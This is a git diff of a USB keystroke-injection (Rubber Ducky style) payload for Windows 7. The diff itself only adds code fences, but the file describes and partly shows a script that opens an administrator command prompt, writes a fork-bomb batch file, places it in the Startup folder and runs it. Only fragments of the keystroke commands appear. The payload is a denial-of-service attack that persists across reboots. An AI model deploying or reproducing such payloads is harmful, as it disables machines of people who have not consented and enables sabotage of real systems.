@@ -3,6 +3,7 @@ Duckencoder: 1.0
 Target: Windows 7
 Description: Opens a command prompt as administrator with run, uses con copy to create fork bomb batch(if you don't know what this is then see: http://en.wikipedia.org/wiki/Fork_bomb). Then saves the .bat file under the start up program folder and runs it the first time.
 
+```
 CONTROL ESCAPE
 DELAY 200
 STRING cmd
@@ -32,3 +33,4 @@ ENTER
 STRING a.bat
 ENTER
 ALT F4
+```
